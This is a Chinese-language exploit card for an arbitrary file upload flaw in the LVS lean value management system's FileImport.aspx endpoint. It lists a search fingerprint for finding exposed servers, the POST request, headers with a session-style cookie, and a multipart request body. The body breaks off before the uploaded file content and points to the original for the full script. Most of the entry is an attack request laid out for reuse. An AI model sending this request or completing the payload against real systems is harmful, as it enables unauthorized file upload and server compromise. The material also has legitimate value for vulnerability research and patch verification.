# LVS精益价值管理系统FileImport存在任意文件上传漏洞

- **系统**：LVS　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"`
- **请求**：`POST /Business/FileImport.aspx HTTP/1.1`
- **关键头**：`Content-Length: 2743`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3yAQlBeB…`　`Cookie: liger-home-tab=%5B%7B%22tabid%22%3A%22menu1288%22%2C%22text%22%3A%22%E6%8A%80%E6…`

**请求体 / payload**
```
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="TimeStamps"
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="PKID"
-1
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="HGUID"
51237042-770e-4193-8f46-ba658acd3403
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="DETAILKEYIDS"
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="_pageurl_"
FileImport.aspx
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="__CURRENT_USERINFO__…（脚本共 2761 字，完整版见原文）
```
- **预期**：200　|　—